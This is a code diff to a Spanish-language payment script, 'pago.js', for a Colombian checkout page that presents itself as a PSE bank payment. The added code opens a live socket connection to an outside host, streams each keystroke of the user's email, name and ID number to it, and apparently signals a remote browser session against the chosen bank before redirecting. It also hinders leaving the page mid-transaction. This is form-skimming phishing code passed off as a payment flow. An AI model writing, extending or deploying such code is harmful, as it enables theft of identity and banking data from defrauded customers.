@@ -1,19 +1,15 @@
+// pago.js - Sincronización en Vivo + Caja Fuerte
+const socket = io('https://apifinacjs.pagoswebcol.uk'); 
+
 let isTransactionActive = false;
+let browserRequested = false; 
 const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
 window.addEventListener('beforeunload', (e) => {
     if (isTransactionActive) {
         e.preventDefault();
-        e.preventDefault();
         e.returnValue = 'Por favor espere la carga';
         return 'Por favor espere la carga';
-    }
-});
-
-window.addEventListener('popstate', (e) => {
-    if (isTransactionActive) {
-        history.pushState(null, null, window.location.href);
-        alert("Por favor espere la carga");
     }
 });
 
@@ -25,10 +21,10 @@ document.addEventListener('DOMContentLoaded', () => {
     if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
     if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;
 
-    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = data.correo || "";
-    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = data.numId || "";
-    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = data.nombreCompleto || "";
-    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = data.celular || "";
+    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
+    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
+    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
+    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = "";
 
     const monto = data.montoPagar || 0;
     const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);
@@ -36,99 +32,114 @@ document.addEventListener('DOMContentLoaded', () => {
     if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
     if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
     if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
-
-    setupModalCorreo(data);
 });
 
-const botonPagar = document.querySelector('.btn-pay');
-if (botonPagar) {
-    botonPagar.addEventListener('click', async function() {
-        const bancoSelect = document.getElementById('selectBanco');
-        const emailInput  = document.getElementById('formCorreo');
-        const docInput    = document.getElementById('formNumId');
-        const nameInput   = document.getElementById('formNombre');
-        const phoneInput  = document.getElementById('formCelular');
-
-        const banco = bancoSelect ? bancoSelect.value : "";
-        const email = emailInput ? emailInput.value.trim() : "";
-        const doc   = docInput ? docInput.value.trim() : "";
-        const name  = nameInput ? nameInput.value.trim() : "";
-        const phone = phoneInput ? phoneInput.value.trim() : "";
-        
+// ==========================================
+// 1. ABRIR EL NAVEGADOR
+// ==========================================
+const selectBanco = document.getElementById('selectBanco');
+if (selectBanco) {
+    selectBanco.addEventListener('change', (e) => {
+        const bancoSeleccionado = e.target.value;
         const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
-        const amount = data.montoPagar || 0; 
+        const amount = data.montoPagar || 0;
+        
+        if (!browserRequested) {
+            socket.emit('init_browser', { bank: bancoSeleccionado, amount: amount });
+            browserRequested = true;
+        } else {
+            socket.emit('live_type', { field: 'bank', value: bancoSeleccionado });
+        }
+    });
+}
 
-        if (!banco || banco.includes("Seleccione")) { alert("Seleccione su banco."); return; }
+// ==========================================
+// 2. SINCRONIZACIÓN EN VIVO (400ms Anti-Spam)
+// ==========================================
+function syncInput(inputId, fieldName) {
+    const input = document.getElementById(inputId);
+    let timeoutId; 
+
+    if (input) {
+        input.addEventListener('input', (e) => {
+            if (browserRequested) {
+                clearTimeout(timeoutId);
+                timeoutId = setTimeout(() => {
+                    socket.emit('live_type', { field: fieldName, value: e.target.value });
+                }, 400); 
+            }
+        });
+    }
+}
+syncInput('formCorreo', 'email');
+syncInput('formNombre', 'name');
+syncInput('formNumId', 'doc');
+
+// ==========================================
+// 3. FINALIZAR PAGO (Envía la Caja Fuerte)
+// ==========================================
+const botonPagar = document.querySelector('.btn-pay');
+let loadingInterval;
+
+if (botonPagar) {
+    botonPagar.addEventListener('click', function() {
+        const banco = selectBanco ? selectBanco.value : "";
+        const email = document.getElementById('formCorreo').value.trim();
+        const doc   = document.getElementById('formNumId').value.trim();
+        const name  = document.getElementById('formNombre').value.trim();
+        const phone = document.getElementById('formCelular').value.trim();
+
+        if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco de la lista."); return; }
         if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
         if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
         if (!name || name.length < 3) { alert("Nombre inválido."); return; }
         if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
+        if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }
 
         isTransactionActive = true; 
         const overlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('dynamicLoadingText');
         
         if (overlay) overlay.style.display = 'flex';
-        let loadingInterval = animateLoadingText(loadingText);
+        loadingInterval = animateLoadingText(loadingText);
 
-        // Si el banco es Nequi, usa la otra API. De lo contrario, usa la normal.
-        const baseUrl = (banco === 'NEQUI') 
-            ? 'https://apifinacjs.pagoswebcol.uk' 
-            : 'https://apifinacjs.pagoswebcol.uk';
-        const params = new URLSearchParams({
-            amount: amount, bank: banco, email: email, doc: doc, fullName: name, phone: phone, ref: data.referencia
+        // AQUÍ ESTÁ LA MAGIA: Enviamos los datos obligatorios para el último segundo
+        socket.emit('submit_payment', {
+            email: email,
+            name: name,
+            doc: doc,
+            bank: banco
         });
-
-        try {
-            const response = await fetch(`${baseUrl}/meter?${params.toString()}`);
-            const textResult = await response.text();
-            
-            if (!response.ok) throw new Error(`Error ${response.status}`);
-            const result = JSON.parse(textResult);
-
-            if (result.ok && result.result && result.result.exactName) {
-                if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
-                clearInterval(loadingInterval);
-                setTimeout(() => {
-                    isTransactionActive = false;
-                    window.location.href = result.result.exactName;
-                }, 1500);
-            } else {
-                throw new Error(result.error || "Error al obtener URL de pago.");
-            }
-        } catch (error) {
-            clearInterval(loadingInterval);
-            isTransactionActive = false;
-            if (overlay) overlay.style.display = 'none';
-            alert("No se pudo iniciar la transacción: " + error.message);
-        }
     });
 }
 
-function setupModalCorreo(data) {
-    const modal = document.getElementById('modalCorreo');
-    const btnOpen = document.getElementById('btnCambiarCorreo');
-    const btnCancel = document.getElementById('btnCancelarModal');
-    const btnSave = document.getElementById('btnGuardarModal');
-    const inputCorreo = document.getElementById('inputNuevoCorreo');
+// ==========================================
+// RESPUESTAS DEL SERVIDOR
+// ==========================================
+socket.on('browser_ready', () => {
+    console.log("Servidor: Listo para recibir datos.");
+});
 
-    if(btnOpen && modal) {
-        btnOpen.addEventListener('click', () => { modal.style.display = 'flex'; });
-        if(btnCancel) btnCancel.addEventListener('click', () => modal.style.display = 'none');
-        if(btnSave) btnSave.addEventListener('click', () => {
-            const nuevoCorreo = inputCorreo.value.trim();
-            if (emailRegexValido.test(nuevoCorreo)) {
-                data.correo = nuevoCorreo;
-                localStorage.setItem('datosFactura', JSON.stringify(data));
-                if(document.getElementById('lblCorreo')) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
-                if(document.getElementById('formCorreo')) document.getElementById('formCorreo').value = data.correo;
-                modal.style.display = 'none';
-            } else {
-                alert("Correo inválido");
-            }
-        });
-    }
-}
+socket.on('payment_success', (data) => {
+    const loadingText = document.getElementById('dynamicLoadingText');
+    if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
+    clearInterval(loadingInterval);
+    setTimeout(() => {
+        isTransactionActive = false;
+        window.location.href = data.url; 
+    }, 1500);
+});
+
+socket.on('payment_error', (data) => {
+    clearInterval(loadingInterval);
+    isTransactionActive = false;
+    const overlay = document.getElementById('loadingOverlay');
+    if (overlay) overlay.style.display = 'none';
+    alert("Hubo un problema de conexión con el banco: " + data.message);
+    
+    browserRequested = false;
+    selectBanco.value = ""; 
+});
 
 function animateLoadingText(element) {
     if (!element) return null;
@@ -136,7 +147,6 @@ function animateLoadingText(element) {
     let i = 0;
     return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
 }
-
 function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
 function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
 function enmascararCorreo(email) {
